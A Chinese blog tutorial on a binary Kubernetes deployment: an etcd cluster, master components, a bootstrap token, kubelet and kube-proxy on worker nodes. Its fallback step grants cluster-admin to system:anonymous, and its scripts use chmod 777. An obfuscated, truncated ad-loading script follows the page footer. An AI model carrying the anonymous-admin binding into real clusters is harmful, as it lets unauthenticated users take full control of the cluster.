<p style="margin-left:.0001pt;text-align:justify;">包含有关etcd、etcdctl和使用指南的各种README文件。这些文件通常包含有关软件的重要信息。</p> 
<p style="margin-left:.0001pt;text-align:justify;">要使用etcd，你可以运行etcd二进制文件以启动etcd服务器。此外，你可以使用etcdctl二进制文件从命令行与etcd集群进行交互。</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><strong>创建用于存放 etcd 配置文件，命令文件，证书的目录</strong></strong></p> 
<pre><code>mkdir -p /opt/etcd/{cfg,bin,ssl}

cd /opt/k8s/etcd-v3.4.9-linux-amd64/

mv etcd etcdctl /opt/etcd/bin/

cp /opt/k8s/etcd-cert/*.pem /opt/etcd/ssl/



cd /opt/k8s/

./etcd.sh etcd01 20.0.0.61 etcd02=https://20.0.0.63:2380,etcd03=https://20.0.0.64:2380
#进入卡住状态等待其他节点加入，这里需要三台etcd服务同时启动，如果只启动其中一台后，服务会卡在那里，直到集群中所有etcd节点都已启动，可忽略这个情况


#可另外打开一个窗口查看etcd进程是否正常
ps -ef | grep etcd</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<h4 id="3%E3%80%81%E8%AF%81%E4%B9%A6%E5%A4%8D%E5%88%B6%E5%88%B0node%E8%8A%82%E7%82%B9" style="margin-left:.0001pt;text-align:justify;">3、证书复制到node节点</h4> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><strong>把etcd相关证书文件、命令文件和服务管理文件全部拷贝到另外两个etcd集群节点</strong></strong></p> 
<pre><code>scp -r /opt/etcd/ root@20.0.0.63:/opt/

scp -r /opt/etcd/ root@20.0.0.64:/opt/

scp /usr/lib/systemd/system/etcd.service root@20.0.0.63:/usr/lib/systemd/system/

scp /usr/lib/systemd/system/etcd.service root@20.0.0.64:/usr/lib/systemd/system/</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><strong>在 node01 节点上操作</strong></strong><strong><strong>（node2同样的操作）</strong></strong></p> 
<pre><code>vim /opt/etcd/cfg/etcd


#[Member]
ETCD_NAME="etcd02" #修改
ETCD_DATA_DIR="/var/lib/etcd/default.etcd"
ETCD_LISTEN_PEER_URLS="https://192.168.233.93:2380" #修改
ETCD_LISTEN_CLIENT_URLS="https://192.168.233.93:2379" #修改


#[Clustering]
ETCD_INITIAL_ADVERTISE_PEER_URLS="https://192.168.233.93:2380" #修改
ETCD_ADVERTISE_CLIENT_URLS="https://192.168.233.93:2379" #修改
ETCD_INITIAL_CLUSTER="etcd01=https://192.168.233.91:2380,etcd02=https://192.168.233.93:2380,etcd03=https://192.168.233.94:2380"
ETCD_INITIAL_CLUSTER_TOKEN="etcd-cluster"
ETCD_INITIAL_CLUSTER_STATE="new"</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="232" src="https://images2.imgbox.com/22/e3/lf6rPAS4_o.png" width="692"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><strong>依次启动etcd，谁先启动谁是主，先启动master（貌似主先启动不了）</strong></strong></p> 
<h4 id="4%E3%80%81%E5%90%AF%E5%8A%A8etcd%E6%9C%8D%E5%8A%A1" style="margin-left:.0001pt;text-align:justify;"><strong><strong>4、启动etcd服务</strong></strong></h4> 
<pre><code>systemctl start etcd

systemctl enable etcd

systemctl status etcd</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="178" src="https://images2.imgbox.com/70/4c/3rwA4yFj_o.png" width="692"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<h4 id="5%E3%80%81%E6%A3%80%E6%9F%A5etcd%E7%BE%A4%E9%9B%86%E7%8A%B6%E6%80%81" style="margin-left:.0001pt;text-align:justify;"><strong><strong>5、检查etcd群集状态</strong></strong></h4> 
<pre><code>ETCDCTL_API=3 /opt/etcd/bin/etcdctl --cacert=/opt/etcd/ssl/ca.pem --cert=/opt/etcd/ssl/server.pem --key=/opt/etcd/ssl/server-key.pem --endpoints="https://20.0.0.61:2379,https://20.0.0.63:2379,https://20.0.0.64:2379" endpoint health --write-out=table</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="183" src="https://images2.imgbox.com/7c/1e/TOVvUoKl_o.png" width="693"></p> 
<p style="margin-left:.0001pt;text-align:justify;">--cert-file：识别HTTPS端使用SSL证书文件</p> 
<p style="margin-left:.0001pt;text-align:justify;">--key-file：使用此SSL密钥文件标识HTTPS客户端</p> 
<p style="margin-left:.0001pt;text-align:justify;">--ca-file：使用此CA证书验证启用https的服务器的证书</p> 
<p style="margin-left:.0001pt;text-align:justify;">--endpoints：集群中以逗号分隔的机器地址列表</p> 
<p style="margin-left:.0001pt;text-align:justify;">cluster-health：检查etcd集群的运行状况</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><strong>查看etcd集群成员列表</strong></strong></p> 
<pre><code>ETCDCTL_API=3 /opt/etcd/bin/etcdctl --cacert=/opt/etcd/ssl/ca.pem --cert=/opt/etcd/ssl/server.pem --key=/opt/etcd/ssl/server-key.pem --endpoints="https://20.0.0.61:2379,https://20.0.0.63:2379,https://20.0.0.64:2379" --write-out=table member list</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="243" src="https://images2.imgbox.com/92/66/mdbYdLKd_o.png" width="693"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;">ID: 节点的唯一标识符。</p> 
<p style="margin-left:.0001pt;text-align:justify;">STATUS: 节点的状态，此处为"started"，表示节点已启动。</p> 
<p style="margin-left:.0001pt;text-align:justify;">NAME: 节点的名称，可能是 "etcd01"、"etcd02" 或 "etcd03"。</p> 
<p style="margin-left:.0001pt;text-align:justify;">PEER ADDRS: 节点用于集群通信的对等地址（用于节点之间的通信）。</p> 
<p style="margin-left:.0001pt;text-align:justify;">CLIENT ADDRS: 节点用于客户端通信的地址（用于 etcdctl 等工具与 etcd 通信）。</p> 
<p style="margin-left:.0001pt;text-align:justify;">IS LEARNER: 标志指示节点是否是学习者，这里的值是 "false"，表示不是学习者。</p> 
<p style="margin-left:.0001pt;text-align:justify;">在 etcd 中，"学习者"（Learner）是指一个节点不参与 Raft 协议的投票过程，仅仅用于复制集群中的数据，</p> 
<p style="margin-left:.0001pt;text-align:justify;">而不对集群的一致性达成做出投票。</p> 
<p style="margin-left:.0001pt;text-align:justify;">学习者节点通常用于扩展集群的读取性能，因为它们不参与 Raft 的写操作，只负责复制数据。</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<h3 id="%E5%9B%9B%E3%80%81%E9%83%A8%E7%BD%B2%20Master%20%E7%BB%84%E4%BB%B6" style="margin-left:.0001pt;text-align:justify;"><strong><strong>四、部署 Master 组件</strong></strong></h3> 
<h4 id="1%E3%80%81%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E3%80%81token%E3%80%81%E8%AF%81%E4%B9%A6" style="margin-left:.0001pt;text-align:justify;">1、<strong><strong>二进制文件、token、证书</strong></strong></h4> 
<p style="margin-left:.0001pt;text-align:justify;">在 master01 节点上操作</p> 
<p style="margin-left:.0001pt;text-align:justify;">#上传 master.zip 和 k8s-cert.sh 到 /opt/k8s 目录中，解压 master.zip 压缩包</p> 
<pre><code>cd /opt/k8s/

unzip master.zip

chmod 777 *.sh</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;">现将配置文件中的IP地址改了：</p> 
<pre><code>vim k8s-cert.sh</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="333" src="https://images2.imgbox.com/39/d9/EtmvPExU_o.png" width="552"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<pre><code>vim admin.sh</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="448" src="https://images2.imgbox.com/8d/bb/VEKYw7qm_o.png" width="692"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<pre><code>vim controller-manager.sh</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="168" src="https://images2.imgbox.com/cb/9d/vwGNb8jE_o.png" width="692"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<pre><code>vim scheduler.sh</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="280" src="https://images2.imgbox.com/40/a4/Fi8gBwgo_o.png" width="692"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><strong>创建kubernetes工作目录</strong></strong></p> 
<pre><code>mkdir -p /opt/kubernetes/{bin,cfg,ssl,logs}</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;">生成CA证书、相关组件的证书和私钥--k8s-cert.sh</p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><strong>创建用于生成CA证书、相关组件的证书和私钥的目录</strong></strong></p> 
<pre><code>mkdir /opt/k8s/k8s-cert
mv /opt/k8s/k8s-cert.sh /opt/k8s/k8s-cert
cd /opt/k8s/k8s-cert/

./k8s-cert.sh
#生成CA证书、相关组件的证书和私钥</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;">k8s-cert.sh</p> 
<p style="margin-left:.0001pt;text-align:justify;">这个脚本用于生成 Kubernetes 集群中各个组件所需的证书和私钥</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><strong>复制CA证书、apiserver相关证书和私钥到 kubernetes工作目录的 ssl 子目录中</strong></strong></p> 
<pre><code>cp ca*pem apiserver*pem /opt/kubernetes/ssl/</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><strong>上传 kubernetes-server-linux-amd64.tar.gz 到 /opt/k8s/ 目录中，解压 kubernetes 压缩包</strong></strong></p> 
<pre><code>cd /opt/k8s/

tar zxvf kubernetes-server-linux-amd64.tar.gz</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><strong>复制master组件的关键命令文件到 kubernetes工作目录的 bin 子目录中</strong></strong></p> 
<pre><code>cd /opt/k8s/kubernetes/server/bin

cp kube-apiserver kubectl kube-controller-manager kube-scheduler /opt/kubernetes/bin/

ln -s /opt/kubernetes/bin/* /usr/local/bin/</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;">创建 bootstrap token 认证文件，apiserver 启动时会调用，然后就相当于在集群内创建了一个这个用户</p> 
<p style="margin-left:.0001pt;text-align:justify;">接下来就可以用 RBAC 进行授权</p> 
<pre><code>cd /opt/k8s/
vim token.sh



#!/bin/bash
#获取随机数前16个字节内容，以十六进制格式输出，并删除其中空格
BOOTSTRAP_TOKEN=$(head -c 16 /dev/urandom | od -An -t x | tr -d ' ')
#生成 token.csv 文件，按照 Token序列号,用户名,UID,用户组 的格式生成
cat &gt; /opt/kubernetes/cfg/token.csv &lt;&lt;EOF
${BOOTSTRAP_TOKEN},kubelet-bootstrap,10001,"system:kubelet-bootstrap"
EOF



chmod 777 token.sh
./token.sh
cat /opt/kubernetes/cfg/token.csv</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="43" src="https://images2.imgbox.com/28/10/N9Jih54O_o.png" width="692"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><strong>二进制文件、token、证书都准备好后</strong></strong></p> 
<h4 id="2%E3%80%81%E5%BC%80%E5%90%AF%20apiserver%20%E6%9C%8D%E5%8A%A1" style="margin-left:.0001pt;text-align:justify;"><strong><strong>2、开启 apiserver 服务</strong></strong></h4> 
<pre><code>cd /opt/k8s/

./apiserver.sh 20.0.0.61 https://20.0.0.61:2379,https://20.0.0.63:2379,https://20.0.0.64:2379</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><strong>检查进程是否启动成功</strong></strong></p> 
<pre><code>ps aux | grep kube-apiserver</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="185" src="https://images2.imgbox.com/e7/aa/Y7RSyyVs_o.png" width="692"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<pre><code>netstat -natp | grep 6443   </code></pre> 
<p style="margin-left:.0001pt;text-align:justify;">#安全端口6443用于接收HTTPS请求，用于基于Token文件或客户端证书等认证</p> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="180" src="https://images2.imgbox.com/d0/4e/XBt07hV0_o.png" width="683"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<h4 id="3%E3%80%81%E5%90%AF%E5%8A%A8%20scheduler%20%E6%9C%8D%E5%8A%A1" style="margin-left:.0001pt;text-align:justify;"><strong><strong>3、启动 scheduler 服务</strong></strong></h4> 
<pre><code>cd /opt/k8s/

./scheduler.sh

ps aux | grep kube-scheduler</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="90" src="https://images2.imgbox.com/1f/23/83BhJfXp_o.png" width="692"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<h4 id="4%E3%80%81%E5%90%AF%E5%8A%A8%20controller-manager%20%E6%9C%8D%E5%8A%A1" style="margin-left:.0001pt;text-align:justify;"><strong><strong>4、启动 controller-manager 服务</strong></strong></h4> 
<pre><code>./controller-manager.sh

ps aux | grep kube-controller-manager</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="189" src="https://images2.imgbox.com/f2/ce/IAFnT97K_o.png" width="692"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<h4 id="5%E3%80%81%E7%94%9F%E6%88%90kubectl%E8%BF%9E%E6%8E%A5%E9%9B%86%E7%BE%A4%E7%9A%84kubeconfig%E6%96%87%E4%BB%B6" style="margin-left:.0001pt;text-align:justify;"><strong><strong>5、生成kubectl连接集群的kubeconfig文件</strong></strong></h4> 
<pre><code>./admin.sh</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<h4 id="6%E3%80%81%E9%80%9A%E8%BF%87kubectl%E5%B7%A5%E5%85%B7%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E9%9B%86%E7%BE%A4%E7%BB%84%E4%BB%B6%E7%8A%B6%E6%80%81" style="margin-left:.0001pt;text-align:justify;"><strong><strong>6、通过kubectl工具查看当前集群组件状态</strong></strong></h4> 
<pre><code>kubectl get cs</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="197" src="https://images2.imgbox.com/99/28/HOM2iO1z_o.png" width="611"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><strong>查看版本信息</strong></strong></p> 
<pre><code>kubectl version</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="129" src="https://images2.imgbox.com/fb/19/vjnifqEW_o.png" width="692"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<h3 id="%E4%BA%94%E3%80%81%E9%83%A8%E7%BD%B2%20Worker%20Node%20%E7%BB%84%E4%BB%B6" style="margin-left:.0001pt;text-align:justify;"><strong><strong>五、部署 Worker Node 组件</strong></strong></h3> 
<h4 id="1%E3%80%81%E9%83%A8%E7%BD%B2kubelet%E5%92%8Cproxy"><strong><strong>1、部署kubelet和proxy</strong></strong></h4> 
<p style="margin-left:.0001pt;text-align:justify;">在所有 node 节点上操作</p> 
<p style="margin-left:.0001pt;text-align:justify;">#创建kubernetes工作目录</p> 
<p style="margin-left:.0001pt;text-align:justify;">mkdir -p /opt/kubernetes/{bin,cfg,ssl,logs}</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;">#上传 node.zip 到 /opt 目录中，解压 node.zip 压缩包，获得kubelet.sh、proxy.sh</p> 
<pre><code>cd /opt/

unzip node.zip

chmod 777 kubelet.sh proxy.sh</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="103" src="https://images2.imgbox.com/d4/53/tCkeanNA_o.png" width="639"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><strong>在 master01 节点上操作</strong></strong></p> 
<pre><code>#把 kubelet、kube-proxy 拷贝到 node 节点

cd /opt/k8s/kubernetes/server/bin

scp kubelet kube-proxy root@20.0.0.63:/opt/kubernetes/bin/

scp kubelet kube-proxy root@20.0.0.64:/opt/kubernetes/bin/</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="132" src="https://images2.imgbox.com/ee/f0/iBKSzRoL_o.png" width="692"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;">#上传kubeconfig.sh文件到/opt/k8s/kubeconfig目录中，生成kubelet初次加入集群引导kubeconfig文件和kube-proxy.kubeconfig文件</p> 
<p style="margin-left:.0001pt;text-align:justify;">#kubeconfig 文件包含集群参数（CA 证书、API Server 地址），</p> 
<p style="margin-left:.0001pt;text-align:justify;">客户端参数（上面生成的证书和私钥），集群 context 上下文参数（集群名称、用户名）。</p> 
<p style="margin-left:.0001pt;text-align:justify;">Kubenetes 组件（如 kubelet、kube-proxy）通过启动时指定不同的 kubeconfig 文件可以切换到不同的集群，</p> 
<p style="margin-left:.0001pt;text-align:justify;">连接到 apiserver。</p> 
<pre><code>#上传kubeconfig.sh文件到/opt/k8s/kubeconfig目录中

mkdir /opt/k8s/kubeconfig



cd /opt/k8s/kubeconfig

chmod 777 kubeconfig.sh

./kubeconfig.sh 20.0.0.61 /opt/k8s/k8s-cert/</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><strong>把配置文件 bootstrap.kubeconfig、kube-proxy.kubeconfig 拷贝到 node 节点</strong></strong></p> 
<pre><code>scp bootstrap.kubeconfig kube-proxy.kubeconfig root@20.0.0.63:/opt/kubernetes/cfg/

scp bootstrap.kubeconfig kube-proxy.kubeconfig root@20.0.0.64:/opt/kubernetes/cfg/</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;">RBAC授权，使用户 kubelet-bootstrap 能够有权限发起 CSR 请求证书</p> 
<pre><code>kubectl create clusterrolebinding kubelet-bootstrap --clusterrole=system:node-bootstrapper --user=kubelet-bootstrap</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;">若执行失败，可先给kubectl绑定默认cluster-admin管理员集群角色，授权对整个集群的管理员权限</p> 
<pre><code>kubectl create clusterrolebinding cluster-system-anonymous --clusterrole=cluster-admin --user=system:anonymous</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><strong>在 node01 节点上操作</strong></strong></p> 
<pre><code>#启动 kubelet 服务
cd /opt/
./kubelet.sh 20.0.0.63
./kubelet.sh 20.0.0.64


ps aux | grep kubelet</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="162" src="https://images2.imgbox.com/6e/5f/frvZnitA_o.png" width="692"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><strong>在 master01 节点上操作，通过 CSR 请求</strong></strong></p> 
<p style="margin-left:.0001pt;text-align:justify;">#检查到 node01 节点的 kubelet 发起的 CSR 请求，Pending 表示等待集群给该节点签发证书</p> 
<pre><code>kubectl get csr</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="62" src="https://images2.imgbox.com/df/e4/uFcWt7IM_o.png" width="692"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;">通过 CSR 请求</p> 
<pre><code>kubectl certificate approve node-csr-1C-Qomwben7_ekyyIMfuL6Of9UowclpR_qP4D1ln_K8

kubectl certificate approve node-csr-74T8yQ8QKj5y1KOm1GikQIPF9yXvQzWilKI2dM-4kjU</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;">Approved,Issued 表示已授权 CSR 请求并签发证书</p> 
<pre><code>kubectl get csr</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="132" src="https://images2.imgbox.com/50/f2/l94s09D1_o.png" width="692"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;">查看节点，由于网络插件还没有部署，节点会没有准备就绪 NotReady</p> 
<pre><code>kubectl get node</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="122" src="https://images2.imgbox.com/25/79/us4ZsbkK_o.png" width="573"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><strong>在 node01 节点上操作</strong></strong></p> 
<p style="margin-left:.0001pt;text-align:justify;">#加载 ip_vs 模块</p> 
<pre><code>for i in $(ls /usr/lib/modules/$(uname -r)/kernel/net/netfilter/ipvs|grep -o "^[^.]*");do echo $i; /sbin/modinfo -F filename $i &gt;/dev/null 2&gt;&amp;1 &amp;&amp; /sbin/modprobe $i;done</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><strong>启动proxy服务</strong></strong></p> 
<pre><code>cd /opt/
./proxy.sh 20.0.0.63
./proxy.sh 20.0.0.64
ps aux | grep kube-proxy</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;">后面的部署接下一篇博客......</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/1eab056b0c76ebcc5cfa9a7f61f983c1/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">【自然语言处理】第3部分：识别文本中的个人身份信息</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/20ce3613d0bfdd73914b1a6bfdae18e8/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">随笔笔记-2023</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,